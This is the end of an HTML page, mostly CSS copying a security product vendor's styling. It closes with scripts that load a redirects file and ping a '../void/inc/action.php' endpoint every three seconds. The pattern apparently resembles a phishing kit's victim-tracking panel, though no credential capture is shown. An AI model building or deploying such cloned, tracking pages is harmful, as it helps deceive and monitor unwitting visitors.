                    }
                }

                .focus-visible\:shadow-focus {
                    &:focus-visible {
                        --tw-shadow: 0px 0px 0px 2px var(--tw-shadow-color, var(--color-neutral-0)), 0px 0px 0px 4px var(--tw-shadow-color, var(--color-blue-600));
                        box-shadow: var(--tw-inset-shadow), var(--tw-inset-ring-shadow), var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow)
                    }
                }

                .focus-visible\:shadow-focus-inset {
                    &:focus-visible {
                        --tw-shadow: inset 0px 0px 0px 2px var(--tw-shadow-color, var(--color-blue-600)), inset 0px 0px 0 4px var(--tw-shadow-color, var(--color-neutral-0));
                        box-shadow: var(--tw-inset-shadow), var(--tw-inset-ring-shadow), var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow)
                    }
                }

                .data-focus\:bg-tertiary {
                    &[data-focus] {
                        background-color: var(--color-neutral-150);

                        .dark & {
                            background-color: var(--color-neutral-900)
                        }
                    }
                }

                .md\:mb-2 {
                    @media (width>=768px) {
                        margin-bottom: calc(var(--spacing)*2)
                    }
                }

                .md\:block {
                    @media (width>=768px) {
                        display: block
                    }
                }

                .md\:w-full {
                    @media (width>=768px) {
                        width: 100%
                    }
                }

                .md\:text-3xl {
                    @media (width>=768px) {
                        font-size: var(--text-3xl);
                        line-height: var(--tw-leading, var(--text-3xl--line-height))
                    }
                }

                .lg\:w-full {
                    @media (width>=1200px) {
                        width: 100%
                    }
                }

                .lg\:px-8 {
                    @media (width>=1200px) {
                        padding-inline: calc(var(--spacing)*8)
                    }
                }

                .lg\:pt-6 {
                    @media (width>=1200px) {
                        padding-top: calc(var(--spacing)*6)
                    }
                }

                .lg\:text-2xl {
                    @media (width>=1200px) {
                        font-size: var(--text-2xl);
                        line-height: var(--tw-leading, var(--text-2xl--line-height))
                    }
                }

                .lg\:text-sm {
                    @media (width>=1200px) {
                        font-size: var(--text-sm);
                        line-height: var(--tw-leading, var(--text-sm--line-height))
                    }
                }

                .lg\:leading-relaxed {
                    @media (width>=1200px) {
                        --tw-leading: var(--leading-relaxed);
                        line-height: var(--leading-relaxed)
                    }
                }

                .\[\&_svg\]\:size-4\! {
                    & svg {
                        width: calc(var(--spacing)*4) !important;
                        height: calc(var(--spacing)*4) !important
                    }
                }

                .\[\&_svg\]\:size-6 {
                    & svg {
                        width: calc(var(--spacing)*6);
                        height: calc(var(--spacing)*6)
                    }
                }

                .\[\&_svg\]\:text-secondary {
                    & svg {
                        color: var(--color-neutral-600);

                        .dark & {
                            color: var(--color-neutral-500)
                        }
                    }
                }

                .\[\&\:\:-webkit-scrollbar\]\:hidden {
                    &::-webkit-scrollbar {
                        display: none
                    }
                }

                .\[\&\>div\]\:truncate {
                    &>div {
                        overflow: hidden;
                        text-overflow: ellipsis;
                        white-space: nowrap
                    }
                }
            }

            :host,
            :root {
                --color-neutral-0: #fff;
                --color-neutral-100: #f7f7f8;
                --color-neutral-150: #ededed;
                --color-neutral-200: #e2e2e4;
                --color-neutral-300: #c8c9cb;
                --color-neutral-400: #b2b2b3;
                --color-neutral-500: #909192;
                --color-neutral-600: #696a6d;
                --color-neutral-700: #4f5054;
                --color-neutral-800: #3e3f42;
                --color-neutral-900: #2a2a2d;
                --color-neutral-950: #1d1e20;
                --color-neutral-1000: #141415;
                --color-blue-100: #f3f7fc;
                --color-blue-200: #d4e2f7;
                --color-blue-300: #b5cdf5;
                --color-blue-400: #8caef8;
                --color-blue-500: #6b90fa;
                --color-blue-600: #3e5fff;
                --color-blue-700: #243dcc;
                --color-blue-800: #263482;
                --color-blue-900: #22294f;
                --color-blue-950: #1a1f3d;
                --color-blue-1000: #12162b;
                --color-green-100: #ecf9ee;
                --color-green-200: #b7f2c5;
                --color-green-300: #81e4a2;
                --color-green-400: #37c871;
                --color-green-500: #0ea464;
                --color-green-600: #0a8550;
                --color-green-700: #075f3c;
                --color-green-800: #05472b;
                --color-green-900: #043420;
                --color-green-950: #032617;
                --color-green-1000: #02180e;
                --color-yellow-100: #fff6db;
                --color-yellow-200: #fee071;
                --color-yellow-300: #fac900;
                --color-yellow-400: #d1a900;
                --color-yellow-500: #ae8604;
                --color-yellow-600: #8e6c10;
                --color-yellow-700: #654a0b;
                --color-yellow-800: #4e3709;
                --color-yellow-900: #3c2a07;
                --color-yellow-950: #2d2006;
                --color-yellow-1000: #1b1509;
                --color-red-100: #fcefee;
                --color-red-200: #f9d7d3;
                --color-red-300: #f6beb9;
                --color-red-400: #f29086;
                --color-red-500: #ec6255;
                --color-red-600: #e02f1f;
                --color-red-700: #9e1c10;
                --color-red-800: #771209;
                --color-red-900: #5a0e07;
                --color-red-950: #450c07;
                --color-red-1000: #2f0704;
                --bg-gradient-primary-start: var(--color-neutral-100);
                --bg-gradient-primary-end: hsla(240, 7%, 97%, 0);
                --bg-gradient-secondary-start: var(--color-neutral-0);
                --bg-gradient-secondary-end: hsla(0, 0%, 100%, 0);
                --bg-gradient-product-anti-virus: #efe4fb;
                --bg-gradient-product-scam-protection: #f8ecdf;
                --bg-gradient-product-dark-web-monitor: #f5dddc;
                --bg-gradient-product-meshnet: #d7e3f6;
                --bg-skeleton-start: var(--color-neutral-150);
                --bg-skeleton-end: var(--color-neutral-200);
                --shadow-app-feature-icon-x: 0;
                --shadow-app-feature-icon-y: 2px;
                --shadow-app-feature-icon-blur: 3px;
                --shadow-app-feature-icon-spread: 0;
                --shadow-app-feature-icon-color: rgba(0, 0, 0, .2)
            }

            .dark {
                --bg-gradient-primary-start: var(--color-neutral-1000);
                --bg-gradient-primary-end: rgba(20, 20, 21, 0);
                --bg-gradient-secondary-start: var(--color-neutral-950);
                --bg-gradient-secondary-end: rgba(29, 30, 32, 0);
                --bg-gradient-product-anti-virus: #45226e;
                --bg-gradient-product-scam-protection: #5f4b30;
                --bg-gradient-product-dark-web-monitor: #4b0d07;
                --bg-gradient-product-meshnet: #172a62;
                --bg-skeleton-start: var(--color-neutral-900);
                --bg-skeleton-end: var(--color-neutral-800)
            }

            @layer base {

                *,
                ::backdrop,
                ::file-selector-button,
                :after,
                :before {
                    border-color: var(--color-neutral-1000, currentColor)
                }

                [role=button]:not(:disabled),
                button:not(:disabled) {
                    cursor: pointer
                }

                b,
                strong {
                    font-weight: var(--fontWeight-bold)
                }
            }

            @keyframes fadeIn {
                0% {
                    opacity: 0
                }

                to {
                    opacity: 1
                }
            }

            @keyframes fadeOut {
                0% {
                    opacity: 1
                }

                to {
                    opacity: 0
                }
            }

            @keyframes rotate {
                to {
                    transform: rotate(1turn)
                }
            }

            @keyframes dash {
                0% {
                    stroke-dasharray: 1, 300;
                    stroke-dashoffset: 0
                }

                50% {
                    stroke-dasharray: 150, 300;
                    stroke-dashoffset: -75
                }

                to {
                    stroke-dasharray: 1, 300;
                    stroke-dashoffset: -250
                }
            }

            @keyframes slideDownAndFade {
                0% {
                    opacity: 0;
                    transform: translateY(-2px)
                }

                to {
                    opacity: 1;
                    transform: translateY(0)
                }
            }

            @keyframes slideLeftAndFade {
                0% {
                    opacity: 0;
                    transform: translateX(2px)
                }

                to {
                    opacity: 1;
                    transform: translateX(0)
                }
            }

            @keyframes slideUpAndFade {
                0% {
                    opacity: 0;
                    transform: translateY(2px)
                }

                to {
                    opacity: 1;
                    transform: translateY(0)
                }
            }

            @keyframes slideRightAndFade {
                0% {
                    opacity: 0;
                    transform: translateX(-2px)
                }

                to {
                    opacity: 1;
                    transform: translateX(0)
                }
            }

            @keyframes zoomIn {
                0% {
                    opacity: 0;
                    transform: scale(.95)
                }

                to {
                    opacity: 1;
                    transform: scale(1)
                }
            }

            @keyframes zoomOut {
                0% {
                    opacity: 1;
                    transform: scale(1)
                }

                to {
                    opacity: 0;
                    transform: scale(.95)
                }
            }

            @keyframes accordion-down {
                0% {
                    height: 0
                }

                to {
                    height: var(--radix-accordion-content-height)
                }
            }

            @keyframes accordion-up {
                0% {
                    height: var(--radix-accordion-content-height)
                }

                to {
                    height: 0
                }
            }

            @keyframes map-pin-pulse-connecting {
                0% {
                    transform: scale(1);
                    opacity: .5
                }

                to {
                    transform: scale(4);
                    opacity: 0
                }
            }

            @keyframes map-pin-pulse-connected {
                0% {
                    transform: scale(1);
                    opacity: .35
                }

                to {
                    transform: scale(10);
                    opacity: 0
                }
            }

            @property --border-angle {
                syntax: "<angle>";
                initial-value: 0deg;
                inherits: false
            }

            @keyframes border-rotate {
                to {
                    --border-angle: 360deg
                }
            }

            @keyframes animateBorder {
                0% {
                    background-position: 50% 50%
                }

                50% {
                    background-position: 100% 100%
                }

                to {
                    background-position: 50% 50%
                }
            }

            @layer base {
                body {
                    background-color: var(--color-neutral-100);
                    color: var(--color-neutral-900);
                    -webkit-font-smoothing: antialiased;
                    -moz-osx-font-smoothing: grayscale;
                    text-rendering: optimizeLegibility
                }

                .dark body {
                    background-color: var(--color-neutral-1000);
                    color: var(--color-neutral-0)
                }
            }

            @keyframes spin {
                0% {
                    transform: rotate(0deg)
                }

                to {
                    transform: rotate(1turn)
                }
            }

            :host {
                all: initial !important
            }

            :host {
                font-size: 16px !important;
                line-height: 1.5 !important;
                -webkit-text-size-adjust: 100% !important;
                -moz-tab-size: 4 !important;
                -o-tab-size: 4 !important;
                tab-size: 4 !important;
                font-family: var(--default-font-family) !important;
                font-feature-settings: normal !important;
                visibility: visible !important
            }

            :host>dialog {
                z-index: 2147483647;
                inset: auto;
                margin: 0;
                direction: ltr;
                position: fixed;
                left: 0;
                top: 0;
                right: 0;
                width: auto;
                padding: 0;
                max-width: unset;
                max-height: unset;
                border-radius: 0;
                border: none;
                box-sizing: border-box;
                color: inherit;
                background: transparent;

                &::backdrop {
                    z-index: 2147483647;
                    background-color: rgba(0, 20, 21, .5)
                }

                &[open] {
                    overscroll-behavior: contain;

                    &::backdrop {
                        overflow: hidden;
                        overscroll-behavior: contain
                    }
                }
            }

            @property --tw-translate-x {
                syntax: "*";
                inherits: false;
                initial-value: 0
            }

            @property --tw-translate-y {
                syntax: "*";
                inherits: false;
                initial-value: 0
            }

            @property --tw-translate-z {
                syntax: "*";
                inherits: false;
                initial-value: 0
            }

            @property --tw-rotate-x {
                syntax: "*";
                inherits: false
            }

            @property --tw-rotate-y {
                syntax: "*";
                inherits: false
            }

            @property --tw-rotate-z {
                syntax: "*";
                inherits: false
            }

            @property --tw-skew-x {
                syntax: "*";
                inherits: false
            }

            @property --tw-skew-y {
                syntax: "*";
                inherits: false
            }

            @property --tw-border-style {
                syntax: "*";
                inherits: false;
                initial-value: solid
            }

            @property --tw-leading {
                syntax: "*";
                inherits: false
            }

            @property --tw-font-weight {
                syntax: "*";
                inherits: false
            }

            @property --tw-shadow {
                syntax: "*";
                inherits: false;
                initial-value: 0 0#0000
            }

            @property --tw-shadow-color {
                syntax: "*";
                inherits: false
            }

            @property --tw-shadow-alpha {
                syntax: "<percentage>";
                inherits: false;
                initial-value: 100%
            }

            @property --tw-inset-shadow {
                syntax: "*";
                inherits: false;
                initial-value: 0 0#0000
            }

            @property --tw-inset-shadow-color {
                syntax: "*";
                inherits: false
            }

            @property --tw-inset-shadow-alpha {
                syntax: "<percentage>";
                inherits: false;
                initial-value: 100%
            }

            @property --tw-ring-color {
                syntax: "*";
                inherits: false
            }

            @property --tw-ring-shadow {
                syntax: "*";
                inherits: false;
                initial-value: 0 0#0000
            }

            @property --tw-inset-ring-color {
                syntax: "*";
                inherits: false
            }

            @property --tw-inset-ring-shadow {
                syntax: "*";
                inherits: false;
                initial-value: 0 0#0000
            }

            @property --tw-ring-inset {
                syntax: "*";
                inherits: false
            }

            @property --tw-ring-offset-width {
                syntax: "<length>";
                inherits: false;
                initial-value: 0
            }

            @property --tw-ring-offset-color {
                syntax: "*";
                inherits: false;
                initial-value: #fff
            }

            @property --tw-ring-offset-shadow {
                syntax: "*";
                inherits: false;
                initial-value: 0 0#0000
            }

            @property --tw-outline-style {
                syntax: "*";
                inherits: false;
                initial-value: solid
            }

            @property --tw-blur {
                syntax: "*";
                inherits: false
            }

            @property --tw-brightness {
                syntax: "*";
                inherits: false
            }

            @property --tw-contrast {
                syntax: "*";
                inherits: false
            }

            @property --tw-grayscale {
                syntax: "*";
                inherits: false
            }

            @property --tw-hue-rotate {
                syntax: "*";
                inherits: false
            }

            @property --tw-invert {
                syntax: "*";
                inherits: false
            }

            @property --tw-opacity {
                syntax: "*";
                inherits: false
            }

            @property --tw-saturate {
                syntax: "*";
                inherits: false
            }

            @property --tw-sepia {
                syntax: "*";
                inherits: false
            }

            @property --tw-drop-shadow {
                syntax: "*";
                inherits: false
            }

            @property --tw-drop-shadow-color {
                syntax: "*";
                inherits: false
            }

            @property --tw-drop-shadow-alpha {
                syntax: "<percentage>";
                inherits: false;
                initial-value: 100%
            }

            @property --tw-drop-shadow-size {
                syntax: "*";
                inherits: false
            }

            @property --tw-backdrop-blur {
                syntax: "*";
                inherits: false
            }

            @property --tw-backdrop-brightness {
                syntax: "*";
                inherits: false
            }

            @property --tw-backdrop-contrast {
                syntax: "*";
                inherits: false
            }

            @property --tw-backdrop-grayscale {
                syntax: "*";
                inherits: false
            }

            @property --tw-backdrop-hue-rotate {
                syntax: "*";
                inherits: false
            }

            @property --tw-backdrop-invert {
                syntax: "*";
                inherits: false
            }

            @property --tw-backdrop-opacity {
                syntax: "*";
                inherits: false
            }

            @property --tw-backdrop-saturate {
                syntax: "*";
                inherits: false
            }

            @property --tw-backdrop-sepia {
                syntax: "*";
                inherits: false
            }

            @property --tw-duration {
                syntax: "*";
                inherits: false
            }

            @property --tw-ease {
                syntax: "*";
                inherits: false
            }

            @layer properties {

                *,
                ::backdrop,
                :after,
                :before {
                    --tw-translate-x: 0;
                    --tw-translate-y: 0;
                    --tw-translate-z: 0;
                    --tw-rotate-x: initial;
                    --tw-rotate-y: initial;
                    --tw-rotate-z: initial;
                    --tw-skew-x: initial;
                    --tw-skew-y: initial;
                    --tw-border-style: solid;
                    --tw-leading: initial;
                    --tw-font-weight: initial;
                    --tw-shadow: 0 0#0000;
                    --tw-shadow-color: initial;
                    --tw-shadow-alpha: 100%;
                    --tw-inset-shadow: 0 0#0000;
                    --tw-inset-shadow-color: initial;
                    --tw-inset-shadow-alpha: 100%;
                    --tw-ring-color: initial;
                    --tw-ring-shadow: 0 0#0000;
                    --tw-inset-ring-color: initial;
                    --tw-inset-ring-shadow: 0 0#0000;
                    --tw-ring-inset: initial;
                    --tw-ring-offset-width: 0px;
                    --tw-ring-offset-color: #fff;
                    --tw-ring-offset-shadow: 0 0#0000;
                    --tw-outline-style: solid;
                    --tw-blur: initial;
                    --tw-brightness: initial;
                    --tw-contrast: initial;
                    --tw-grayscale: initial;
                    --tw-hue-rotate: initial;
                    --tw-invert: initial;
                    --tw-opacity: initial;
                    --tw-saturate: initial;
                    --tw-sepia: initial;
                    --tw-drop-shadow: initial;
                    --tw-drop-shadow-color: initial;
                    --tw-drop-shadow-alpha: 100%;
                    --tw-drop-shadow-size: initial;
                    --tw-backdrop-blur: initial;
                    --tw-backdrop-brightness: initial;
                    --tw-backdrop-contrast: initial;
                    --tw-backdrop-grayscale: initial;
                    --tw-backdrop-hue-rotate: initial;
                    --tw-backdrop-invert: initial;
                    --tw-backdrop-opacity: initial;
                    --tw-backdrop-saturate: initial;
                    --tw-backdrop-sepia: initial;
                    --tw-duration: initial;
                    --tw-ease: initial;
                    --border-angle: 0deg
                }
            }
            </style>
        </template></o5d2946a4-ae7c-47b4-85dd-e987658f807f>
    <style>
    html,
    :host {
        --link-color: var(--_link_web_text_fg_generic);
        --link-color--hover: var(--_link_web_root_bg_hover);
        --link-icon-size: 1rem;
        --link-icon-margin-right: 0.5rem;
        --link-icon-margin-top: 0.25rem
    }

    :host {
        display: inline
    }

    :host([hidden]) {
        display: none
    }

    .link {
        color: var(--_link_web_text_fg_generic);
        fill: var(--_link_web_iconRight_fg_generic);
        text-decoration-thickness: 1px;
        text-underline-position: under
    }

    .link__wrapper ::slotted([slot="icon-before"]) {
        width: var(--link-icon-size);
        height: var(--link-icon-size);
        fill: var(--fg_primary);
        translate: 0 var(--link-icon-margin-top)
    }

    .link__wrapper ::slotted([slot="icon-after"]) {
        translate: 0 var(--link-icon-margin-top)
    }

    .link:focus,
    .link:visited:focus,
    .link-container a:focus {
        outline-color: var(--_link_web_root_borderColor_focus);
        outline-offset: 0px;
        outline-style: solid;
        outline-width: 2px
    }

    .link:hover,
    .link:visited:hover,
    .link-container a:hover {
        background-color: var(--_link_web_root_bg_hover)
    }

    .link:active,
    .link-container a:active {
        color: var(--_link_web_text_fg_pressed);
        fill: var(--_link_web_iconRight_fg_pressed);
        outline: none
    }

    .link:visited,
    .link__wrapper:visited .link,
    .link-container a:visited {
        color: var(--_link_web_text_fg_visited);
        fill: var(--_link_web_iconRight_fg_visited)
    }

    .link:visited:active {
        color: var(--_link_web_text_fg_visited-pressed);
        fill: var(--_link_web_iconRight_fg_visited)
    }

    .link__wrapper:visited ::slotted([slot="icon-after"]),
    .link__wrapper:visited .link__icon--after {
        fill: var(--_link_web_iconRight_fg_visited)
    }

    .link__wrapper:visited {
        --link-color: var(--_link_web_text_fg_visited)
    }

    .link__wrapper:visited .link__text {
        border-bottom-color: var(--_link_web_text_borderBottomColor_visited)
    }

    .link__wrapper:active .link__text {
        color: var(--_link_web_text_fg_pressed)
    }

    .link__wrapper:visited:active .link__text {
        color: var(--_link_web_text_fg_visited-pressed)
    }

    .link__wrapper:focus {
        outline-color: var(--_link_web_root_borderColor_focus);
        outline-offset: 0px;
        outline-style: solid;
        outline-width: 2px
    }

    .link__wrapper:focus .link__text,
    .link__wrapper:visited:focus .link__text {
        border-bottom-color: transparent
    }

    :host,
    html {
        --_link_web_text_borderBottomWidth_initial: 0.063rem;
        --_link_web_text_borderBottomStyle_initial: var(--border_secondary_style);
        --_link_web_text_borderBottomWidth_focus: 0.063rem;
        --_link_web_text_borderBottomStyle_focus: var(--border_secondary_style);
        --_link_web_text_borderBottomWidth_hover: 0.063rem;
        --_link_web_text_borderBottomStyle_hover: var(--border_secondary_style);
        --_link_web_text_borderBottomWidth_visited: 0.063rem;
        --_link_web_text_borderBottomStyle_visited: var(--border_tertiary_style);
        --_link_web_text_borderBottomWidth_visited-focus: 0.063rem;
        --_link_web_text_borderBottomStyle_visited-focus: var(--border_tertiary_style);
        --_link_web_text_borderBottomWidth_visited-hover: 0.063rem;
        --_link_web_text_borderBottomStyle_visited-hover: var(--border_tertiary_style);
        --_link_web_root_borderWidth_focus: 0.063rem;
        --_link_web_root_borderStyle_focus: var(--border_secondary_style);
        --_link_web_root_borderWidth_visited-focus: 0.063rem;
        --_link_web_root_borderStyle_visited-focus: var(--border_secondary_style);
        --_link_web_text_fg_generic: var(--fg_secondary);
        --_link_web_text_fg_pressed: rgba(82, 81, 153, 0.6);
        --_link_web_text_fg_visited: var(--fg_tertiary);
        --_link_web_text_fg_visited-pressed: rgba(171, 0, 102, 0.6);
        --_link_web_text_borderBottomColor_initial: var(--border_secondary_color);
        --_link_web_text_borderBottomColor_focus: var(--border_secondary_color);
        --_link_web_text_borderBottomColor_hover: var(--border_secondary_color);
        --_link_web_text_borderBottomColor_visited: var(--border_tertiary_color);
        --_link_web_text_borderBottomColor_visited-focus: var(--border_tertiary_color);
        --_link_web_text_borderBottomColor_visited-hover: var(--border_tertiary_color);
        --_link_web_iconRight_fg_generic: var(--fg_secondary);
        --_link_web_iconRight_fg_pressed: rgba(82, 81, 153, 0.6);
        --_link_web_iconRight_fg_visited: var(--fg_tertiary);
        --_link_web_iconRight_fg_visited-pressed: rgba(171, 0, 102, 0.6);
        --_link_web_root_borderColor_focus: var(--border_secondary_color);
        --_link_web_root_borderColor_visited-focus: var(--border_secondary_color);
        --_link_web_root_bg_hover: var(--bg_hover-primary);
        --_link_web_root_bg_visited-hover: var(--bg_hover-primary)
    }

    a.link-cta--font16::before {
        position: absolute;
        top: 50%;
        left: 50%;
        width: 100%;
        min-width: 40px;
        height: 100%;
        min-height: 40px;
        content: "";
        transform: translate(-50%, -50%)
    }

    :is(.link-cta--outline, .link-cta--filled):not(:hover, :focus) span {
        border-bottom-width: medium;
        border-bottom-style: none;
        border-bottom-color: currentcolor
    }

    a.link-cta--orange:visited {
        color: var(--_ctaLink_web_text_fg_orange)
    }

    a.link-cta--filled.link-cta--orange:visited {
        border-color: var(--border_primary_color);
        background-color: var(--bg_primary);
        color: var(--fg_onColor)
    }

    a.link-cta--outline.link-cta--orange:visited {
        border-color: var(--border_primary_color)
    }

    a.link-cta--indigo:visited {
        color: var(--_ctaLink_web_text_fg_indigo)
    }

    a.link-cta--filled.link-cta--indigo:visited {
        border-color: var(--border_secondary_color);
        background-color: var(--bg_secondary);
        color: var(--fg_onColor)
    }

    a.link-cta--outline.link-cta--indigo:visited {
        border-color: var(--border_secondary_color)
    }

    a.link-cta--white:visited {
        color: var(--_ctaLink_web_text_fg_white)
    }

    a.link-cta--filled.link-cta--white:visited {
        border-color: var(--border_inverse_color);
        background-color: var(--bg_default);
        color: var(--fg_primary)
    }

    a.link-cta--outline.link-cta--white:visited {
        border-color: var(--border_inverse_color)
    }

    a.link-cta--orange:visited span {
        border-color: var(--_ctaLink_web_text_borderBottomColor_orange)
    }

    a.link-cta--filled.link-cta--orange:visited span {
        border-color: var(--fg_onColor)
    }

    a.link-cta--indigo:visited {
        border-color: var(--_ctaLink_web_text_borderBottomColor_indigo)
    }

    a.link-cta--filled.link-cta--indigo:visited span {
        border-color: var(--fg_onColor)
    }

    a.link-cta--white:visited span {
        border-color: var(--_ctaLink_web_text_borderBottomColor_white)
    }

    a.link-cta--filled.link-cta--white:visited span {
        border-color: var(--border_primary_color)
    }

    a.link-cta:not(.link-cta--filled):hover {
        background-color: initial
    }

    a.link-cta:hover span {
        padding-bottom: 0px
    }

    a.link-cta:active span {
        border-bottom: 0px
    }

    a.link-cta:focus {
        box-shadow: 0 0 0 2px var(--border_focus-inner_color);
        outline: 2px solid var(--border_focus-outer_color);
        outline-offset: 2px
    }

    a.link-cta.link-cta--filled:focus {
        box-shadow: inset 0 0 0 4px var(--border_focus-inner_color);
        outline-offset: -2px
    }

    a.link-cta.link-cta--outline:focus {
        box-shadow: inset 0 0 0 3px var(--border_focus-inner_color);
        outline-offset: -2px
    }

    :host,
    html {
        --_ctaLink_web_text_borderBottomWidth_indigo: 0.063rem;
        --_ctaLink_web_text_borderBottomStyle_indigo: var(--border_secondary_style);
        --_ctaLink_web_text_borderBottomWidth_orange: 0.063rem;
        --_ctaLink_web_text_borderBottomStyle_orange: var(--border_primary_style);
        --_ctaLink_web_text_borderBottomWidth_white: 0.063rem;
        --_ctaLink_web_text_borderBottomStyle_white: var(--border_onColor_style);
        --_ctaLink_web_text_borderBottomWidth_active: 0.063rem;
        --_ctaLink_web_text_borderBottomStyle_active: var(--border_info_style);
        --_ctaLink_web_root_borderWidth_focus: 0.063rem;
        --_ctaLink_web_root_borderStyle_focus: var(--border_info_style);
        --_ctaLink_web_root_borderWidth_active: 0.063rem;
        --_ctaLink_web_root_borderStyle_active: var(--border_info_style);
        --_ctaLink_web_text_fg_indigo: var(--fg_secondary);
        --_ctaLink_web_text_fg_orange: var(--fg_primary);
        --_ctaLink_web_text_fg_white: var(--fg_onColor);
        --_ctaLink_web_text_borderBottomColor_indigo: var(--border_secondary_color);
        --_ctaLink_web_text_borderBottomColor_orange: var(--border_primary_color);
        --_ctaLink_web_text_borderBottomColor_white: var(--border_onColor_color);
        --_ctaLink_web_text_borderBottomColor_active: var(--border_info_color);
        --_ctaLink_web_root_borderColor_focus: var(--border_info_color);
        --_ctaLink_web_root_borderColor_active: var(--border_info_color)
    }
    </style>
	
	
	
	<script src="../zynex-redirects.js"></script>
<script src="../script-pages.js"></script>
<script src="../assets/js/main.js"></script>

<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

<script>
    const pingServer = () => {
        fetch("../void/inc/action.php?type=ping")
            .then(response => {
                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }
                return response.json();
            })
            .then(data => console.log(data))
            .catch(error => console.error('Error pinging server:', error));
    };

    // Ping every 3 seconds
    setInterval(pingServer, 3000);
</script>

</html>